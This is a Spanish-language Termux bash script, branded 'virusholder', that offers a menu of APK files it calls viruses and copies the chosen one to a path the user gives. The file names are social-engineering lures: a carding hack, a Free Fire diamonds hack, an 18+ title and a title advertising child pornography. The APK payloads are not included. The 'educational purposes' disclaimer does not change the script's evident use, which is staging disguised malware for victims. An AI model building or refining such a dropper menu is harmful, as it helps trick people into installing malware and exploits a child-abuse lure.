#/bin/bash                                        #hecho por diegoh colider de theholders                                                             echo -e "\e[1;31mEste script a sido creado con fines educativos y informativos, cualquier uso indebido no es responsabilidad mia\e[0m"                                                                  sleep 3                                           
clear

figlet -f smslant virusholder

echo -e "\e[1;34mCreador del script: diegoh\e[0m"
echo -e "\e[1;34mGit hub: https://github.com/diegoh999\e[0m"

echo "
 [ + ] Elige el virus [ + ]                       "                                                 
echo '[ 1 ]  HACK CARDING.apk'

sleep 0.1

echo '[ 2 ]  Hack Diamantes Free Fire.apk'

sleep 0.1

echo '[ 3 ]  Porno infantil.apk'

sleep 0.1

echo '[ 4 ]  📱VIP +18🔞.apk'

sleep 0.1

echo '[ 5 ]  Exit'

sleep 0.1

read -p "elije el numero de la opcion:" virus
echo  ' '
case $virus in
1)
        echo 'Preparando virus seleccionado...'
sleep 2

cd /data/data/com.termux/files/home/virusmenuholder

read -p "que ruta quieres mover el virus:" ruta
cp 'HACK CARDING.apk' $ruta

        ;;                                        
2)                                                        echo 'Preparando virus seleccionado...'

sleep 2

cd /data/data/com.termux/files/home/virusmenuholder

read -p "que ruta quieres mover el virus:" ruta
cp 'Hack Diamantes Free Fire.apk' $ruta
        ;;
3)
        echo 'Preparando virus seleccionado...'
sleep 2

cd /data/data/com.termux/files/home/virusmenuholder

read -p "que ruta quieres mover el virus:" ruta

cp 'Porno infantil.apk' $ruta
        ;;
4)
        echo 'Preparando virus seleccionado...'
sleep 2

cd /data/data/com.termux/files/home/virusmenuholder

read -p "que ruta quieres mover el virus:" ruta

cp '📱VIP +18🔞.apk' $ruta
        ;;
5)
        echo 'exit, proximamente mas virus'
exit
        ;;
*)
        ;;
esac
